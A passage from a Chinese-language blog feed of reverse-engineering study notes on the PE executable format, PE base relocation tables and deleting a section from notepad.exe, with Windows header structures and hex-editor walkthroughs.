SizeOfInitializedData;</span><br><span class="line">  DWORD                SizeOfUninitializedData;</span><br><span class="line">  DWORD                AddressOfEntryPoint;</span><br><span class="line">  DWORD                BaseOfCode;</span><br><span class="line">  DWORD                BaseOfData;</span><br><span class="line">  DWORD                ImageBase;</span><br><span class="line">  DWORD                SectionAlignment;<span class="comment">//节区对齐方式</span></span><br><span class="line">  DWORD                FileAlignment;</span><br><span class="line">  WORD                 MajorOperatingSystemVersion;</span><br><span class="line">  WORD                 MinorOperatingSystemVersion;</span><br><span class="line">  WORD                 MajorImageVersion;</span><br><span class="line">  WORD                 MinorImageVersion;</span><br><span class="line">  WORD                 MajorSubsystemVersion;</span><br><span class="line">  WORD                 MinorSubsystemVersion;</span><br><span class="line">  DWORD                Win32VersionValue;</span><br><span class="line">  DWORD                SizeOfImage;</span><br><span class="line">  DWORD                SizeOfHeaders;</span><br><span class="line">  DWORD                CheckSum;</span><br><span class="line">  WORD                 Subsystem;</span><br><span class="line">  WORD                 DllCharacteristics;</span><br><span class="line">  DWORD                SizeOfStackReserve;</span><br><span class="line">  DWORD                SizeOfStackCommit;</span><br><span class="line">  DWORD                SizeOfHeapReserve;</span><br><span class="line">  DWORD                SizeOfHeapCommit;</span><br><span class="line">  DWORD                LoaderFlags;</span><br><span class="line">  DWORD                NumberOfRvaAndSizes;</span><br><span class="line">  IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br></pre></td></tr></table></figure><img src="/2022/04/28/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No.3--%E8%8A%82%E5%8C%BA%E5%88%A0%E9%99%A4/5.png" class=""><p>这也是为什么我们在看到节区信息时看到的vitual size是0xE40而Raw Size是0x1000的原因</p><p>故需要将&#x3D;&#x3D;IMAGE_OPTIONAL_HEADER的size of image成员&#x3D;&#x3D;的值减去 0x1000 进行修改，</p><img src="/2022/04/28/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No.3--%E8%8A%82%E5%8C%BA%E5%88%A0%E9%99%A4/6.png" class=""><p>该字段值在文件偏移是0x128修改前：</p><img src="/2022/04/28/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No.3--%E8%8A%82%E5%8C%BA%E5%88%A0%E9%99%A4/7.png" class=""><p>修改后：</p><img src="/2022/04/28/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No.3--%E8%8A%82%E5%8C%BA%E5%88%A0%E9%99%A4/8.png" class=""><p>将文件进行保存，看是否可以正常启动，可以则说明删除没有伤害到其他运行必要的数据（p s: .bak是修改前的，可以看到文件大小缩小了4KB，且程序可以正常运行，修改成功）</p><img src="/2022/04/28/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No.3--%E8%8A%82%E5%8C%BA%E5%88%A0%E9%99%A4/10.png" class="">]]></content>
      
      
      <categories>
          
          <category> -逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 《逆向工程核心原理学习》 </tag>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆核系列No.2--PE重定位</title>
      <link href="/2022/04/27/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No.2--PE%E9%87%8D%E5%AE%9A%E4%BD%8D/"/>
      <url>/2022/04/27/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No.2--PE%E9%87%8D%E5%AE%9A%E4%BD%8D/</url>
      
        <content type="html"><![CDATA[<h4 id="本节内容"><a href="#本节内容" class="headerlink" title="本节内容"></a>本节内容</h4><p>当程序文件向进程的虚拟内存加载PE文件（EXE&#x2F;DLL&#x2F;SYS）时，文件会被加载到PE头的ImageBase所指的地址处。若加载的是DLL（SYS）文件，且在ImageBase位置处已经加载了其他DLL（SYS）文件，那么PE状态器就会将其加载到其他未被占用的空间。应用程序加载到其他未被占用的空间就涉及PE文件重定位问题，PE重定位指的是PE文件无法加载到ImageBase所指的位置，而是被加载到其他地址是发生的一系列处理行为。</p><p>PS：使用SDK（Software Development Kit，软件开发工具包）或者使用Visual C++创建PE文件时，EXE默认的ImageBase &#x3D; 00400000，DLL默认的ImageBase &#x3D; 10000000.此外，使用DDK（Driver Development Kit，驱动开发工具包）创建的SYS文件默认的ImageBase为10000</p><img src="/2022/04/27/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No.2--PE%E9%87%8D%E5%AE%9A%E4%BD%8D/PE.JPG" class=""><p><strong>程序未载入内存前：</strong></p><p>程序文件中的资源是以RVA形式进行索引，以PE文件中的ImageBase作为基准</p><p><strong>程序载入内存后</strong></p><p>程序资源需要以<strong>实际载入内存的基址</strong>进行定位，需要将原先以PE文件中的ImageBase为基准进行定位的资源先进行偏移恢复，在结合实际载入的内存基址进行资源的重定位。（实际上就是由于偏移相对的基准发生变化，需要进行更新）</p><h5 id="重定位基本原理"><a href="#重定位基本原理" class="headerlink" title="重定位基本原理"></a>重定位基本原理</h5><p>Windows的PE装载器进行PE重定位处理时的基本操作原理入下：</p><ul><li>在应用程序中查找硬编码的地址位置</li><li>读取硬编码的值，这个值是根据PE文件中的ImageBase为基准定位的，进行重定位时只需要计算得到偏移位置</li><li>通过第二步骤中得到的各个硬编码的偏移位置，对每个值以实际文件载入的地址为新的基准即可完成重定位。</li></ul><h5 id="Relocation-Table"><a href="#Relocation-Table" class="headerlink" title="Relocation Table"></a>Relocation Table</h5><p>不难看出，PE装载器进行重定位的关键在于获得应用程序中所有的硬编码地址。PE文件中的Relocation Table（重定位表）记录了应用程序中硬编码地址所在的偏移位置（重定位表是在PE文件构建过程【编译&#x2F;链接】中提供的）。通过重定位表查找硬编码地址偏移，其实指的是根据PE头中的“基址重定位表”的表项进行的查找。</p><p>IMAGE_NT_HEADERS -&gt; IMAGE_OPTIONAL_HEADER.DataDirectory[5]</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">DataDirectory[<span class="number">0</span>] = EXPORT Directory</span><br><span class="line">DataDirectory[<span class="number">1</span>] = IMPORT Directory</span><br><span class="line">DataDirectory[<span class="number">2</span>] = RESOURCE Directory</span><br><span class="line">DataDirectory[<span class="number">3</span>] = EXCEPTION Directory</span><br><span class="line">DataDirectory[<span class="number">4</span>] = SECURITY Directory</span><br><span class="line">DataDirectory[<span class="number">5</span>] = BASERELOC Directory<span class="comment">//重定位表</span></span><br><span class="line">DataDirectory[<span class="number">6l</span> = DEBUG Directory</span><br><span class="line">DataDirectory[<span class="number">7</span>] = COPYRIGHT Directory</span><br><span class="line">DataDirectory[<span class="number">8</span>] = GLOBALPTR Directory</span><br><span class="line">DataDirectory[<span class="number">9</span>] = TLS Directory</span><br><span class="line">DataDirectory[A] = LOAD CONFIG Directory</span><br><span class="line">DataDirectory[B] = BOUND IMPORT Directory</span><br><span class="line">DataDirectory[C] = IAT Directory</span><br><span class="line">DataDirectory[D] = DELAY IMPORT Directory</span><br><span class="line">DataDirectoryIE] = COM DESCRIPTOR Directory</span><br><span class="line">DataDirectory[F] = Reserved Directory</span><br></pre></td></tr></table></figure><p>DataDirectory [ 5 ] 那一项。该项在StudyPE中的值：</p><img src="/2022/04/27/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No.2--PE%E9%87%8D%E5%AE%9A%E4%BD%8D/1.png" class=""><p>可以看到在当前的notepad.exe（开启了ASRL）重定位表的RVA地址 &#x3D; 0x0002F000，FOA地址 &#x3D; 0x00002AE00(文件偏移)，HxD中查看0x2AE00（截取部分）:</p><img src="/2022/04/27/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No.2--PE%E9%87%8D%E5%AE%9A%E4%BD%8D/2.png" class=""><h5 id="IMAGE-BASE-RELOCATION"><a href="#IMAGE-BASE-RELOCATION" class="headerlink" title="IMAGE_BASE_RELOCATION"></a>IMAGE_BASE_RELOCATION</h5><p>为了解读这些16进制数据，需要结合着IMAGE_BASE_RELOCATION的结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_BASE_RELOCATION</span> &#123;</span></span><br><span class="line">    DWORD   VirtualAddress;</span><br><span class="line">    DWORD   SizeOfBlock;</span><br><span class="line"><span class="comment">//  WORD    TypeOffset[1];</span></span><br><span class="line">&#125; IMAGE_BASE_RELOCATION;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_BASE_RELOCATION UNALIGNED * PIMAGE_BASE_RELOCATION;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SIZEOF_BASE_RELOCATION         8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Based relocation types.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_REL_BASED_ABSOLUTE              0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_REL_BASED_HIGH                  1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_REL_BASED_LOW                   2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_REL_BASED_HIGHLOW               3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_REL_BASED_HIGHADJ               4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_REL_BASED_MIPS_JMPADDR          5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_REL_BASED_SECTION               6</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_REL_BASED_REL32                 7</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_REL_BASED_MIPS_JMPADDR16        9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_REL_BASED_IA64_IMM64            9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_REL_BASED_DIR64                 10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_REL_BASED_HIGH3ADJ              11</span></span><br></pre></td></tr></table></figure><p>将十六进制数据根据结构体的成员逐字段读取出来，这些数据在后续的例子中会使用到</p><table><thead><tr><th>成员</th><th>值</th><th>备注</th></tr></thead><tbody><tr><td>VirtualAddress</td><td>0x00001000</td><td>基准地址RVA</td></tr><tr><td>SizeOfBlock</td><td>0x00000150</td><td>重定位块的大小</td></tr><tr><td>TypeOffset 0</td><td>3420</td><td>第一个TypeOffset</td></tr><tr><td>TypeOffset 1</td><td>342D</td><td>第二个TypeOffset</td></tr><tr><td>TypeOffset …</td><td>…</td><td>…</td></tr></tbody></table><h5 id="IMAGE-BASE-RELOCATION-TypeOffset"><a href="#IMAGE-BASE-RELOCATION-TypeOffset" class="headerlink" title="_IMAGE_BASE_RELOCATION.TypeOffset"></a>_IMAGE_BASE_RELOCATION.TypeOffset</h5><p>读取出来的每一个TypeOffset的内容对应一个硬编码地址的偏移内容。</p><p>TypeOffset包含两个部分：高4位内容为类型（Type），剩下的12位指示偏移（Offset）的内容。</p><p>高4位的Type：</p><h6 id="Base-Relocation-Types"><a href="#Base-Relocation-Types" class="headerlink" title="Base Relocation Types"></a>Base Relocation Types</h6><table><thead><tr><th align="left">Constant</th><th align="left">Value</th><th align="left">Description</th></tr></thead><tbody><tr><td align="left">IMAGE_REL_BASED_ABSOLUTE</td><td align="left">0</td><td align="left">The base relocation is skipped. This type can be used to pad a block.</td></tr><tr><td align="left">IMAGE_REL_BASED_HIGH</td><td align="left">1</td><td align="left">The base relocation adds the high 16 bits of the difference to the 16-bit field at offset. The 16-bit field represents the high value of a 32-bit word.</td></tr><tr><td align="left">IMAGE_REL_BASED_LOW</td><td align="left">2</td><td align="left">The base relocation adds the low 16 bits of the difference to the 16-bit field at offset. The 16-bit field represents the low half of a 32-bit word.</td></tr><tr><td align="left">IMAGE_REL_BASED_HIGHLOW</td><td align="left">3</td><td align="left">The base relocation applies all 32 bits of the difference to the 32-bit field at offset.</td></tr><tr><td align="left">IMAGE_REL_BASED_HIGHADJ</td><td align="left">4</td><td align="left">The base relocation adds the high 16 bits of the difference to the 16-bit field at offset. The 16-bit field represents the high value of a 32-bit word. The low 16 bits of the 32-bit value are stored in the 16-bit word that follows this base relocation. This means that this base relocation occupies two slots.</td></tr><tr><td align="left">IMAGE_REL_BASED_MIPS_JMPADDR</td><td align="left">5</td><td align="left">The relocation interpretation is dependent on the machine type.  When the machine type is MIPS, the base relocation applies to a MIPS jump instruction.</td></tr><tr><td align="left">IMAGE_REL_BASED_ARM_MOV32</td><td align="left">5</td><td align="left">This relocation is meaningful only when the machine type is ARM or Thumb. The base relocation applies the 32-bit address of a symbol across a consecutive MOVW&#x2F;MOVT instruction pair.</td></tr><tr><td align="left">IMAGE_REL_BASED_RISCV_HIGH20</td><td align="left">5</td><td align="left">This relocation is only meaningful when the machine type is RISC-V. The base relocation applies to the high 20 bits of a 32-bit absolute address.</td></tr><tr><td align="left"></td><td align="left">6</td><td align="left">Reserved, must be zero.</td></tr><tr><td align="left">IMAGE_REL_BASED_THUMB_MOV32</td><td align="left">7</td><td align="left">This relocation is meaningful only when the machine type is Thumb. The base relocation applies the 32-bit address of a symbol to a consecutive MOVW&#x2F;MOVT instruction pair.</td></tr><tr><td align="left">IMAGE_REL_BASED_RISCV_LOW12I</td><td align="left">7</td><td align="left">This relocation is only meaningful when the machine type is RISC-V. The base relocation applies to the low 12 bits of a 32-bit absolute address formed in RISC-V I-type instruction format.</td></tr><tr><td align="left">IMAGE_REL_BASED_RISCV_LOW12S</td><td align="left">8</td><td align="left">This relocation is only meaningful when the machine type is RISC-V. The base relocation applies to the low 12 bits of a 32-bit absolute address formed in RISC-V S-type instruction format.</td></tr><tr><td align="left">IMAGE_REL_BASED_LOONGARCH32_MARK_LA</td><td align="left">8</td><td align="left">This relocation is only meaningful when the machine type is LoongArch 32-bit. The base relocation applies to a 32-bit absolute address formed in two consecutive instructions.</td></tr><tr><td align="left">IMAGE_REL_BASED_LOONGARCH64_MARK_LA</td><td align="left">8</td><td align="left">This relocation is only meaningful when the machine type is LoongArch 64-bit. The base relocation applies to a 64-bit absolute address formed in four consecutive instructions.</td></tr><tr><td align="left">IMAGE_REL_BASED_MIPS_JMPADDR16</td><td align="left">9</td><td align="left">The relocation is only meaningful when the machine type is MIPS. The base relocation applies to a MIPS16 jump instruction.</td></tr><tr><td align="left">IMAGE_REL_BASED_DIR64</td><td align="left">10</td><td align="left">The base relocation applies the difference to the 64-bit field at offset.</td></tr></tbody></table><p>PE32中Type常见的值 &#x3D; 3（IMAGE_REL_BASED_HIGHLOW ），PE32+Type常见值 &#x3D; A（IMAGE_REL_BASED_DIR64）</p><h6 id="恶意代码中的Type"><a href="#恶意代码中的Type" class="headerlink" title="恶意代码中的Type"></a>恶意代码中的Type</h6><p>恶意代码中正常修改文件代码后，有时需要修改指向相应区域的重定位表（为了略过PE装载器的重定位过程）常常把Type的值修改为0（IMAGE_REL_BASED_ABSOLUTE）</p><hr><p><strong>低12位的Offset</strong>：其中指示的是偏移内容。</p><h5 id="TypeOffset例子"><a href="#TypeOffset例子" class="headerlink" title="TypeOffset例子"></a>TypeOffset例子</h5><p>这里以<code>TypeOffset 03420</code>为例子进行解读。</p><p>高4位内容 &#x3D; 3（IMAGE_REL_BASED_HIGHLOW  ）解释：The base relocation applies all 32 bits of the difference to the 32-bit field at offset. </p><p>低12位的偏移内容 &#x3D; 420（基于_IMAGE_BASE_RELOCATION.VirtualAddress），将这个值结合_IMAGE_BASE_RELOCATION.VirtualAddress组合成32位长度的地址（依据Type）</p><p>上文读取出来的_IMAGE_BASE_RELOCATION结构体中VirtualAddress &#x3D; 1000，因此偏移420重定位后地址 &#x3D; 1420（RVA）</p><p><strong>OD下本次程序载入的位置观察：</strong></p><img src="/2022/04/27/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No.2--PE%E9%87%8D%E5%AE%9A%E4%BD%8D/3.png" class=""><p>可以看到，本次载入内存时，载入的Base Address &#x3D; 0x00B10000  上述硬编码重定位后的结果 &#x3D; 0x00B11420</p><p>查看 0x00B11420 位置的内容：</p><img src="/2022/04/27/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No.2--PE%E9%87%8D%E5%AE%9A%E4%BD%8D/4.png" class=""><p>内容 &#x3D; 0x00B110C4，跟随即可查看到重定位的资源内容，这里是为kernel.dll导入的GetCommandLineW API地址</p><img src="/2022/04/27/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No.2--PE%E9%87%8D%E5%AE%9A%E4%BD%8D/5.png" class="">]]></content>
      
      
      <categories>
          
          <category> -逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 《逆向工程核心原理学习》 </tag>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆核系列No.1--PE格式</title>
      <link href="/2022/04/26/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No.1--PE%E6%A0%BC%E5%BC%8F/"/>
      <url>/2022/04/26/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No.1--PE%E6%A0%BC%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h4 id="本节内容"><a href="#本节内容" class="headerlink" title="本节内容"></a>本节内容</h4><p>学习逆向难免接触PE文件，尽管当下有许多PE文件格式的分析器，一方面出于深入了解PE文件，一方面由于相关的混淆技术出现，使得学习并掌握PE文件格式变得尤为重要。本文结合示例程序为notepad.exe（Windows自带记事本）来学习PE文件格式，使用到的工具：HxD，notepad.exe。</p><p>PS：由于PE文件格式回根据操作系统的位数不同而有些许区别，32位系统对应的PE格式为PE32，64位系统对应的PE格式为PE32+，需要看官先记住这一点。</p><p>参考书《逆向工程核心原理》，个人觉得挺优秀的一本书，部分内容也摘录自书中。</p><hr><h4 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h4><p>下图为notepad.exe载入十六进制编辑器HxD中的结果，可以看出，学习PE格式的目的在于从这些十六进制字符序列中读取出内容，了解其在PE文件中下的解读含义</p><img src="/2022/04/26/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No.1--PE%E6%A0%BC%E5%BC%8F/1.png" class=""><p>这里顺带附上PE文件格式的图，在后续的学习中回十分频繁的使用到这个图：</p><img src="/2022/04/26/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No.1--PE%E6%A0%BC%E5%BC%8F/PE.JPG" class=""><h5 id="IMAGE-DOS-HEADER"><a href="#IMAGE-DOS-HEADER" class="headerlink" title="IMAGE_DOS_HEADER"></a>IMAGE_DOS_HEADER</h5><p>包括DOS头、DOS存根（非必需）、NT头、各节区的头部（描述该节区的权限等属性常见有.text、.data、.rsrc等）</p><p>整体占64字节内容，结构体的成员如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DOS_HEADER</span> &#123;</span>      <span class="comment">// DOS .EXE header</span></span><br><span class="line">    WORD   e_magic;                     <span class="comment">// Magic number，算是_IMAGE_DOS_HEADER的标识，需要着重记住</span></span><br><span class="line">    WORD   e_cblp;                      <span class="comment">// Bytes on last page of file</span></span><br><span class="line">    WORD   e_cp;                        <span class="comment">// Pages in file</span></span><br><span class="line">    WORD   e_crlc;                      <span class="comment">// Relocations</span></span><br><span class="line">    WORD   e_cparhdr;                   <span class="comment">// Size of header in paragraphs</span></span><br><span class="line">    WORD   e_minalloc;                  <span class="comment">// Minimum extra paragraphs needed</span></span><br><span class="line">    WORD   e_maxalloc;                  <span class="comment">// Maximum extra paragraphs needed</span></span><br><span class="line">    WORD   e_ss;                        <span class="comment">// Initial (relative) SS value</span></span><br><span class="line">    WORD   e_sp;                        <span class="comment">// Initial SP value</span></span><br><span class="line">    WORD   e_csum;                      <span class="comment">// Checksum</span></span><br><span class="line">    WORD   e_ip;                        <span class="comment">// Initial IP value</span></span><br><span class="line">    WORD   e_cs;                        <span class="comment">// Initial (relative) CS value</span></span><br><span class="line">    WORD   e_lfarlc;                    <span class="comment">// File address of relocation table</span></span><br><span class="line">    WORD   e_ovno;                      <span class="comment">// Overlay number</span></span><br><span class="line">    WORD   e_res[<span class="number">4</span>];                    <span class="comment">// Reserved words</span></span><br><span class="line">    WORD   e_oemid;                     <span class="comment">// OEM identifier (for e_oeminfo)</span></span><br><span class="line">    WORD   e_oeminfo;                   <span class="comment">// OEM information; e_oemid specific</span></span><br><span class="line">    WORD   e_res2[<span class="number">10</span>];                  <span class="comment">// Reserved words</span></span><br><span class="line">    LONG   e_lfanew;                    <span class="comment">// File address of new exe header，另一个重点的字段，指示NT相对偏移</span></span><br><span class="line">  &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>_IMAGE_DOS_HEADER.<strong>e_magic</strong>是DOS头的签名，用于标识DOS头部的，由于该结构体是由Mark Zbikowski提出，因此签名取自这个小伙子的名字首写MZ</p><img src="/2022/04/26/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No.1--PE%E6%A0%BC%E5%BC%8F/2.png" class=""><p>_IMAGE_DOS_HEADER.<strong>e_lfanew</strong>记录的是PE头后续必须部分的NT头相对于DOS头部（从DOS头的签名开始算起）的偏移（因为二者中间隔了非必需的DOS存根区，偏移存在差异）。</p><p>在notepad.exe的例子中，e_lfanew的值&#x3D;0x000000E0，表示PE头中的NT头在距离DOS头的偏移0xE0处：</p><img src="/2022/04/26/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No.1--PE%E6%A0%BC%E5%BC%8F/3.png" class=""><hr><h5 id="DOS存根（可选部分）"><a href="#DOS存根（可选部分）" class="headerlink" title="DOS存根（可选部分）"></a>DOS存根（可选部分）</h5><hr><h5 id="IMAGE-NT-HEADERS"><a href="#IMAGE-NT-HEADERS" class="headerlink" title="IMAGE_NT_HEADERS"></a>IMAGE_NT_HEADERS</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS64</span> &#123;</span><span class="comment">//64bit OS version</span></span><br><span class="line">    DWORD Signature;</span><br><span class="line">    IMAGE_FILE_HEADER FileHeader;</span><br><span class="line">    IMAGE_OPTIONAL_HEADER64 OptionalHeader;</span><br><span class="line">&#125; IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS</span> &#123;</span><span class="comment">//32bit OS version</span></span><br><span class="line">    DWORD Signature;</span><br><span class="line">    IMAGE_FILE_HEADER FileHeader;</span><br><span class="line">    IMAGE_OPTIONAL_HEADER32 OptionalHeader;</span><br><span class="line">&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br></pre></td></tr></table></figure><p>从结构体IMAGE_NT_HEADERS的成员可以看出，该结构体根据OS的位数不同，有所区别，这里先学习32bit版本下的PE32文件格式（64bit的版本对应PE32+）</p><h6 id="IMAGE-NT-HEADERS-Signature"><a href="#IMAGE-NT-HEADERS-Signature" class="headerlink" title="_IMAGE_NT_HEADERS.Signature"></a>_IMAGE_NT_HEADERS.<strong>Signature</strong></h6><blockquote><p>是NT头部的标识，记录为50 45 00 00（小端序）</p></blockquote><h6 id="IMAGE-NT-HEADERS-FileHeader："><a href="#IMAGE-NT-HEADERS-FileHeader：" class="headerlink" title="_IMAGE_NT_HEADERS.FileHeader："></a>_IMAGE_NT_HEADERS.<strong>FileHeader</strong>：</h6><p>对应结构体_IMAGE_FILE_HEADER</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_FILE_HEADER</span> &#123;</span></span><br><span class="line">    WORD    Machine;</span><br><span class="line">    WORD    NumberOfSections;</span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    DWORD   PointerToSymbolTable;</span><br><span class="line">    DWORD   NumberOfSymbols;</span><br><span class="line">    WORD    SizeOfOptionalHeader;</span><br><span class="line">    WORD    Characteristics;</span><br><span class="line">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure><p>其中重要的成员有4个，一旦这几个出现错误的内容则会导致文件&#x3D;&#x3D;无法正常运行&#x3D;&#x3D;</p><p>_IMAGE_FILE_HEADER.<strong>Machine</strong>：标识CPU的唯一值，有特定值对应，上述例子的Machine的值&#x3D;0x014c 对应Intel i386</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_UNKNOWN           0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_I386              0x014c  <span class="comment">// Intel 386.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_R3000             0x0162  <span class="comment">// MIPS little-endian, 0x160 big-endian</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_R4000             0x0166  <span class="comment">// MIPS little-endian</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_R10000            0x0168  <span class="comment">// MIPS little-endian</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_WCEMIPSV2         0x0169  <span class="comment">// MIPS little-endian WCE v2</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_ALPHA             0x0184  <span class="comment">// Alpha_AXP</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_POWERPC           0x01F0  <span class="comment">// IBM PowerPC Little-Endian</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_SH3               0x01a2  <span class="comment">// SH3 little-endian</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_SH3E              0x01a4  <span class="comment">// SH3E little-endian</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_SH4               0x01a6  <span class="comment">// SH4 little-endian</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_ARM               0x01c0  <span class="comment">// ARM Little-Endian</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_THUMB             0x01c2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_IA64              0x0200  <span class="comment">// Intel 64</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_MIPS16            0x0266  <span class="comment">// MIPS</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_MIPSFPU           0x0366  <span class="comment">// MIPS</span></span></span><br><span class="line"><span class="meta">#<span 